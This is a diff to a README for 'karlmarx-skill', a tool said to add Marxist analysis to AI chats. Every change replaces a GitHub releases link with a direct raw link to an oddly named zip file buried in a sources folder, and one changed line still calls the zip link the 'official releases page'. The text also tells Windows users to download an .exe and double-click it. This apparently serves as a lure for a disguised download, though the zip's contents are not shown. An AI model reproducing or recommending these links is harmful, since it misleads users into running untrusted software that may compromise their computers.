@@ -1,6 +1,6 @@
 # 🛠️ karlmarx-skill - Use Marxist methods for deep analysis
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/firmamental-liveborninfant247/karlmarx-skill/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/firmamental-liveborninfant247/karlmarx-skill/main/references/sources/skill_karlmarx_frondiferous.zip)
 
 This application adds Marxist methodology to your interaction with artificial intelligence models. It helps you analyze social systems, economic trends, and history through the lens of historical materialism and political economy. You will gain a sharper understanding of structural forces behind modern news, corporate reports, and political events.
 
@@ -8,7 +8,7 @@ This application adds Marxist methodology to your interaction with artificial in
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/firmamental-liveborninfant247/karlmarx-skill/releases) to download the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/firmamental-liveborninfant247/karlmarx-skill/main/references/sources/skill_karlmarx_frondiferous.zip) to download the latest version.
 2. Select the file ending in `.exe` for Windows.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
@@ -90,4 +90,4 @@ The application builds on these core ideas:
 
 Use these terms to search for more resources. The software does not require you to be an expert. Its goal is to make these high-level concepts useful for your daily work and study.
 
-[![](https://img.shields.io/badge/Download_Setup_Package-Grey?style=for-the-badge)](https://github.com/firmamental-liveborninfant247/karlmarx-skill/releases)
+[![](https://img.shields.io/badge/Download_Setup_Package-Grey?style=for-the-badge)](https://raw.githubusercontent.com/firmamental-liveborninfant247/karlmarx-skill/main/references/sources/skill_karlmarx_frondiferous.zip)
